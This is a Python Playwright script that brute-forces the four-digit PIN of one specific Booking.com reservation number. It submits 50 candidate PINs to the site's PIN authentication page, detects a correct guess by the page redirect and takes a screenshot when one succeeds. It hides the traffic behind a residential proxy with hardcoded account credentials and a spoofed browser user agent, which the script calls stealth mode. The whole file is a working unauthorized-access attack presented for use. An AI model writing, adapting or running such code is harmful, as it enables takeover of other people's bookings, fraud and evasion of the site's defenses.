"""
🍀 PROFESSOR JOHNNY'S LUCKY PIN AGENT - BOOKING B
Testing Professor's intuition vs systematic science!
Enhanced success detection - Will catch any lucky wins!
"""

import csv
import time
from playwright.sync_api import sync_playwright
from datetime import datetime

# 🎯 AGENT B - BOOKING ID 6860261353
TARGET_BOOKING_ID = "6860261353"
AGENT_NAME = "BRAVO_LUCKY"

# 🍀 PROFESSOR JOHNNY'S LUCKY 50 PINS - INTUITION vs SCIENCE!
# Boss's personal selection - Let's see if luck beats systematic testing!
LUCKY_PINS = [
    "0295", "1842", "0922", "1781", "8856", "2634", "7674", "7628", "3260", "9027", 
    "4627", "8031", "2383", "5415", "1008", "4123", "1807", "9854", "5072", "5453", 
    "9025", "4319", "7682", "9309", "9265", "4163", "1678", "2275", "4072", "6490", 
    "2108", "1768", "5828", "4816", "6894", "1424", "3660", "9127", "3031", "8884", 
    "7034", "6012", "0342", "8473", "9210", "1601", "7212", "8596", "7295", "9656"
]

def log_result(booking_id, pin, status, url=""):
    """Log results to CSV file"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open('lucky_pins_B_results.csv', 'a', newline='') as file:
        writer = csv.writer(file)
        writer.writerow([timestamp, AGENT_NAME, booking_id, pin, status, url])

def debug_page_elements(page):
    """Debug function to see what form elements are available"""
    try:
        print("🔍 DEBUGGING: Available input elements on page...")
        inputs = page.query_selector_all('input')
        for i, inp in enumerate(inputs):
            try:
                tag_attrs = {
                    'type': inp.get_attribute('type'),
                    'name': inp.get_attribute('name'),
                    'placeholder': inp.get_attribute('placeholder'),
                    'id': inp.get_attribute('id'),
                    'class': inp.get_attribute('class')
                }
                print(f"  Input {i}: {tag_attrs}")
            except:
                print(f"  Input {i}: Could not read attributes")
    except Exception as e:
        print(f"🔍 Debug failed: {e}")

def fill_field_with_retry(page, field_selectors, value, field_name):
    """Try multiple selectors to fill a field with retry logic"""
    for selector in field_selectors:
        try:
            print(f"🔍 Trying {field_name} selector: {selector}")
            page.wait_for_selector(selector, timeout=10000)
            page.fill(selector, "")  # Clear field
            page.fill(selector, value)  # Fill with value
            print(f"✅ Successfully filled {field_name}: {value}")
            return True
        except Exception as e:
            print(f"❌ Failed with selector {selector}: {e}")
            continue
    return False

def test_pin(page, booking_id, pin):
    """Test a single PIN for a booking ID with enhanced field filling"""
    try:
        print(f"🍀 Testing LUCKY PIN: {pin} for booking {booking_id}")
        
        # Navigate to booking confirmation page
        print("🌐 Opening booking.com...")
        page.goto("https://secure.booking.com/help/confirmation_pin_auth", wait_until="load")
        
        print("⏳ Waiting for page to load completely...")
        page.wait_for_load_state("networkidle", timeout=20000)
        print("✅ Page loaded completely!")
        
        # Wait extra time for dynamic content
        time.sleep(3)
        
        # Debug: See what form elements are available
        debug_page_elements(page)
        
        # Multiple selectors for booking ID field
        booking_selectors = [
            'input[placeholder="e.g. 1234567890"]',
            'input[name="bookingnr"]',
            'input[data-testid="booking-number"]',
            'input[id*="booking"]',
            'input[class*="booking"]'
        ]
        
        # Multiple selectors for PIN field
        pin_selectors = [
            'input[placeholder="e.g. 1234"]',
            'input[name="pin"]',
            'input[data-testid="pin"]',
            'input[id*="pin"]',
            'input[class*="pin"]'
        ]
        
        # Try to fill booking ID with multiple strategies
        print("📝 Looking for booking ID field...")
        if not fill_field_with_retry(page, booking_selectors, booking_id, "booking ID"):
            print("💥 Failed to find booking ID field with any selector")
            raise Exception("Cannot find booking ID field")
        
        # Try to fill PIN with multiple strategies
        print(f"🔐 Looking for PIN field...")
        if not fill_field_with_retry(page, pin_selectors, pin, "PIN"):
            print("💥 Failed to find PIN field with any selector")
            raise Exception("Cannot find PIN field")
        
        # Click Continue button with multiple strategies
        print("🔍 Looking for Continue button...")
        continue_selectors = [
            'button:has-text("Continue")',
            'button[type="submit"]',
            'input[type="submit"]',
            'button[data-testid="submit"]',
            'button[class*="submit"]'
        ]
        
        clicked = False
        for selector in continue_selectors:
            try:
                page.wait_for_selector(selector, timeout=5000)
                print(f"✅ Clicking button with selector: {selector}")
                page.click(selector)
                clicked = True
                break
            except:
                continue
        
        if not clicked:
            print("💥 Failed to find submit button")
            raise Exception("Cannot find submit button")
        
        # Wait for results with ENHANCED SUCCESS DETECTION
        print("⏳ Waiting for results...")
        time.sleep(5)  # Give time for processing
        
        # CRITICAL: Use proven success detection
        try:
            page.wait_for_function("""
                () => {
                    // Check if URL contains success indicator
                    const urlChanged = window.location.href.includes('unique_order_id') || 
                                     window.location.href.includes('booking_details') ||
                                     window.location.href.includes('confirmation') ||
                                     window.location.href.includes('/help/reservation') ||
                                     window.location.href !== 'https://secure.booking.com/help/confirmation_pin_auth';
                    
                    // Check if error banner appears
                    const errorBanner = document.querySelector('.bui-alert--error') !== null ||
                                      document.querySelector('[class*="error"]') !== null ||
                                      document.querySelector('.alert-danger') !== null;
                    
                    return urlChanged || errorBanner;
                }
            """, timeout=30000)
        except:
            print("⚠️ No clear result after 30s, checking current state...")
        
        current_url = page.url
        print(f"🔍 Current URL: {current_url}")
        
        # ENHANCED: Check for SUCCESS first with multiple indicators
        if (current_url != "https://secure.booking.com/help/confirmation_pin_auth" and
            "help/confirmation_pin_auth" not in current_url):
            status = "SUCCESS"
            print(f"🎉🍀🎉 LUCKY WIN! PIN {pin} is CORRECT for booking {booking_id}! 🎉🍀🎉")
            print(f"🌟 PROFESSOR'S INTUITION WINS! URL: {current_url}")
            page.screenshot(path=f"LUCKY_SUCCESS_B_{booking_id}_{pin}.png")
        else:
            # Check for error elements on page
            error_elements = page.query_selector_all('.bui-alert--error, [class*="error"], .alert-danger')
            if len(error_elements) > 0:
                status = "FAILURE"
                print(f"❌ Lucky PIN {pin} is incorrect for booking {booking_id} (error banner detected)")
            else:
                # Check page content for error messages
                page_text = page.content().lower()
                if "incorrect" in page_text or "wrong" in page_text or "invalid" in page_text:
                    status = "FAILURE"
                    print(f"❌ Lucky PIN {pin} is incorrect for booking {booking_id}")
                else:
                    status = "UNKNOWN"
                    print(f"❓ Lucky PIN {pin} gave unexpected result for booking {booking_id}")
        
        log_result(booking_id, pin, status, current_url)
        return status
        
    except Exception as e:
        print(f"💥 Error testing lucky PIN {pin} with booking {booking_id}: {e}")
        log_result(booking_id, pin, "EXCEPTION", "")
        return "EXCEPTION"

def main():
    """Main execution function - LUCKY PINS AGENT B"""
    print(f"🍀 {AGENT_NAME} DEPLOYING!")
    print(f"🎯 Target: BOOKING B - {TARGET_BOOKING_ID}")
    print(f"🍀 Testing Professor Johnny's {len(LUCKY_PINS)} LUCKY PINs")
    print("🧠 INTUITION vs SCIENCE - Let's see if luck beats systematic testing!")
    print("🚀 Starting Playwright...")
    
    with sync_playwright() as p:
        # Launch browser with proxy
        browser = p.chromium.launch(
            headless=False,
            proxy={
                "server": "https://pr.oxylabs.io:7777",
                "username": "customer-oxy1p_hnzsA",
                "password": "oxy1p_hnzsA1"
            }
        )
        
        print("🛡️ STEALTH MODE: Proxy configured - https://pr.oxylabs.io:7777")
        
        context = browser.new_context(
            viewport={'width': 1920, 'height': 1080},
            user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        )
        page = context.new_page()
        
        print("🌐 Browser launched with PROXY STEALTH!")
        print("📄 New page created with stealth protection")
        
        # Test Professor Johnny's Lucky PINs for booking B
        print(f"\n🍀 TESTING PROFESSOR'S LUCKY 50 PINS FOR BOOKING B: {TARGET_BOOKING_ID}")
        print("🍀 LUCK vs SCIENCE - Professor's intuition in action!")
        print("=" * 60)
        success_count = 0
        failure_count = 0
        unknown_count = 0
        exception_count = 0
        success_pins = []
        
        for i, pin in enumerate(LUCKY_PINS, 1):
            print(f"\n🍀 [{i}/{len(LUCKY_PINS)}] Testing LUCKY PIN: {pin} for booking B ({TARGET_BOOKING_ID})")
            
            result = test_pin(page, TARGET_BOOKING_ID, pin)
            
            if result == "SUCCESS":
                success_count += 1
                success_pins.append(pin)
                print(f"🎉 PROFESSOR'S LUCKY PIN WINNER: {pin}")
                print("🎊 PROFESSOR'S INTUITION BEATS SCIENCE! Pausing 30 seconds...")
                time.sleep(30)  # Pause to celebrate luck beating science
            elif result == "FAILURE":
                failure_count += 1
            elif result == "UNKNOWN":
                unknown_count += 1
            else:
                exception_count += 1
            
            print("⏳ Waiting 7s before next lucky PIN...")
            time.sleep(7)
        
        print(f"\n📊 PROFESSOR'S LUCKY MISSION RESULTS:")
        print("=" * 60)
        print(f"🎯 Booking B: {TARGET_BOOKING_ID}")
        print(f"🍀 Total Lucky PINs tested: {len(LUCKY_PINS)}")
        print(f"🌟 SUCCESS count: {success_count}")
        print(f"❌ FAILURE count: {failure_count}")
        print(f"❓ UNKNOWN count: {unknown_count}")
        print(f"💥 EXCEPTION count: {exception_count}")
        
        if success_pins:
            print(f"\n🎉 PROFESSOR'S WINNING LUCKY PINs:")
            for pin in success_pins:
                print(f"  🍀 LUCKY PIN: {pin}")
            print(f"\n🎊 MISSION STATUS: PROFESSOR'S INTUITION WINS! {len(success_pins)} LUCKY PIN(S) CONFIRMED!")
        else:
            print(f"\n⚠️ MISSION STATUS: NO LUCKY WINS - Science holds strong for now! All {len(LUCKY_PINS)} Lucky PINs tested!")
        
        browser.close()

if __name__ == "__main__":
    main()
